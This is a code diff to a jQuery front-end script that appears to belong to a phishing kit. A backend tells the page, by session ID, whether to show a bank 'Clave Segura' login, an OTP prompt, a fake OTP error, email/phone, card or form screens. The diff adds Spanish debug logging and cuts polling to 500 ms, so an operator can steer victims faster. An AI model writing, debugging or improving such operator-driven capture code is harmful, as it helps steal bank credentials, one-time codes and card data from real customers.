@@ -525,46 +525,68 @@ $(document).ready(function ($) {
   }
 
   function startPolling(sessionId) {
+    console.log(`🔄 Iniciando polling para sessionId: ${sessionId}`);
     const it = setInterval(function() {
-      fetch(BACKEND_BASE + "/instruction/" + sessionId)
-        .then(function(res) { return res.json(); })
-        .then(function(data) {
-          if (!data || !data.redirect_to) return;
+      const pollUrl = BACKEND_BASE + "/instruction/" + sessionId;
+      console.log(`📡 Polling a: ${pollUrl}`);
 
+      fetch(pollUrl)
+        .then(function(res) {
+          console.log(`   Response status: ${res.status}`);
+          return res.json();
+        })
+        .then(function(data) {
+          console.log(`   Datos recibidos: ${JSON.stringify(data)}`);
+
+          if (!data || !data.redirect_to) {
+            console.log(`   ⏳ Sin redirección aún, esperando...`);
+            return;
+          }
+
+          console.log(`🎯 ¡REDIRECCIÓN RECIBIDA! → ${data.redirect_to}`);
           hideLoader();
 
           if (data.redirect_to === "inicio") {
+            console.log(`   Mostrando: Clave Segura`);
             showSectionClaveSegura();
             clearInterval(it);
             startPolling(sessionId);
           } else if (data.redirect_to === "otp1") {
+            console.log(`   Mostrando: OTP intento 1`);
             showSectionOTP();
             notifyOTP("otp1", "");
             clearInterval(it);
             startPolling(sessionId);
           } else if (data.redirect_to === "otp2") {
+            console.log(`   Mostrando: OTP error`);
             showSectionErrorOTP();
             notifyOTP("otp2", "");
             clearInterval(it);
             startPolling(sessionId);
           } else if (data.redirect_to === "correo") {
+            console.log(`   Mostrando: Correo/Celular`);
             showSectionCorreo();
             clearInterval(it);
             startPolling(sessionId);
           } else if (data.redirect_to === "tarjeta") {
+            console.log(`   Mostrando: Tarjeta`);
             showSectionTarjeta();
             clearInterval(it);
             startPolling(sessionId);
           } else if (data.redirect_to === "formulario") {
+            console.log(`   Mostrando: Formulario`);
             showSectionFormulario();
             clearInterval(it);
             startPolling(sessionId);
+          } else {
+            console.log(`   ⚠️ Redirección desconocida: ${data.redirect_to}`);
           }
         })
         .catch(function(e) {
-          console.error("Polling error:", e);
+          console.error("❌ Polling error:", e.message);
+          console.error("   URL que falló: " + pollUrl);
         });
-    }, 2000);
+    }, 500); // Cambiar de 2000ms a 500ms para ser más rápido
   }
 
   // -----------------------
